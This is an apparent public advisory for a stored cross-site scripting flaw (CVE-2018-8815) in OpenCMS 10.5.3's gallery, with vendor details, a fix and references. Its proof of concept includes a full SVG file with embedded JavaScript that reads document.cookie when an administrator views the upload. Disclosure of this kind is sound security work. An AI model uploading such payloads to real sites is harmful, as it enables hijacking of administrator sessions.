@@ -1,0 +1,51 @@
+# Exploit Title: OpenCMS 10.5.3 Stored Cross Site Scripting Vulnerability
+# Google Dork: N/A
+# Date: 02-04-2018
+#######################################
+# Exploit Author: Sureshbabu Narvaneni
+# Author Blog : http://nullnews.in
+# Vendor Homepage: http://www.opencms.org/en/
+# Software Link: http://www.opencms.org/en/modules/downloads/begindownload.html?id=a7747cd0-b27b-11e7-8299-7fde8b0295e1
+# Affected Version: 10.5.3
+# Category: WebApps
+# Tested on: Ubuntu 14.04 x86_64/Kali Linux 4.12 i686
+# CVE : CVE-2018-8815
+
+1. Vendor Description:
+
+OpenCms from Alkacon Software is a professional, easy to use website
+content management system. OpenCms helps content managers worldwide to
+create and maintain beautiful websites fast and efficiently.
+
+2. Technical Description:
+
+Cross-site scripting (XSS) vulnerability in the gallery function in Alkacon
+OpenCMS 10.5.3 allows remote attackers to inject arbitrary web script or
+HTML via a malicious SVG image.
+
+3. Proof Of Concept:
+
+a) Login as user who is having Gallery Editor role.
+b) Navigate to gallery and upload below svg file.
+
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "
+http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+    <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900"
+stroke="#004400"/>
+    <script type="text/javascript">
+      alert(document.cookie);
+    </script>
+</svg>
+c) Once other user who is having Root Administrator permissions visited the
+image link or viewed the uploaded svg image the script get executed.
+
+4. Solution:
+
+Upgrade to latest release.
+http://www.opencms.org/en/home/news.html
+
+5. Reference:
+https://github.com/alkacon/opencms-core/issues/587
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-8815
